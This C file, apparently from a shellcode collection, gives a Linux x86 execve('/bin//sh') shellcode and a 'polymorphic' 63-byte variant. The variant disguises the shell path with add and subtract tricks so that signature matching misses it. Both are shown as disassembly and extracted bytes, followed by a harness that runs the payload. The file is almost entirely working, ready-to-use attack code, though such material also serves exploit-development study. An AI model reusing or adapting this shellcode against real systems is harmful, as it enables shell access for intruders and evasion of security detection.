/*
; Date: 09/03/2019
; Polymorphic_Execve_Sh_Stack.asm
; Author: Daniele Votta
; Description: This program invoke a Polimorphic version of excve.

Original Execve_Sh_Stack:     file format elf32-i386
Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 2f 2f 73 68       	push   0x68732f2f
 8048088:	68 2f 62 69 6e       	push   0x6e69622f
 804808d:	89 e3                	mov    ebx,esp
 804808f:	50                   	push   eax
 8048090:	89 e2                	mov    edx,esp
 8048092:	53                   	push   ebx
 8048093:	89 e1                	mov    ecx,esp
 8048095:	b0 0b                	mov    al,0xb
 8048097:	cd 80                	int    0x80

[+] Extract Shellcode ...
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

Shellcode Length:25

======================= POC Daniele Votta =======================

Polimorphic_Execve_Sh_Stack:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c3                	xor    ebx,eax
 8048082:	31 d8                	xor    eax,ebx
 8048084:	89 c1                	mov    ecx,eax
 8048086:	51                   	push   ecx
 8048087:	bf 40 40 84 79       	mov    edi,0x79844040
 804808c:	81 ef 11 11 11 11    	sub    edi,0x11111111
 8048092:	89 7c 24 fc          	mov    DWORD PTR [esp-0x4],edi
 8048096:	bf 2f 62 69 6e       	mov    edi,0x6e69622f
 804809b:	81 c7 11 11 11 11    	add    edi,0x11111111
 80480a1:	81 ef 11 11 11 11    	sub    edi,0x11111111
 80480a7:	89 7c 24 f8          	mov    DWORD PTR [esp-0x8],edi
 80480ab:	83 ec 04             	sub    esp,0x4
 80480ae:	83 ec 04             	sub    esp,0x4
 80480b1:	89 e3                	mov    ebx,esp
 80480b3:	50                   	push   eax
 80480b4:	89 e2                	mov    edx,esp
 80480b6:	53                   	push   ebx
 80480b7:	89 e1                	mov    ecx,esp
 80480b9:	b0 01                	mov    al,0x1
 80480bb:	04 0a                	add    al,0xa
 80480bd:	cd 80                	int    0x80

[+] Extract Shellcode ...
"\x31\xc3\x31\xd8\x89\xc1\x51\xbf\x40\x40\x84\x79\x81\xef\x11\x11\x11\x11\x89\x7c\x24\xfc\xbf\x2f\x62\x69\x6e\x81\xc7\x11\x11\x11\x11\x81\xef\x11\x11\x11\x11\x89\x7c\x24\xf8\x83\xec\x04\x83\xec\x04\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x01\x04\x0a\xcd\x80"

Shellcode Length:63

======================= POC Daniele Votta =======================
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc3\x31\xd8\x89\xc1\x51\xbf\x40\x40\x84\x79\x81\xef\x11\x11\x11\x11\x89\x7c\x24\xfc\xbf\x2f\x62\x69\x6e\x81\xc7\x11\x11\x11\x11\x81\xef\x11\x11\x11\x11\x89\x7c\x24\xf8\x83\xec\x04\x83\xec\x04\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x01\x04\x0a\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}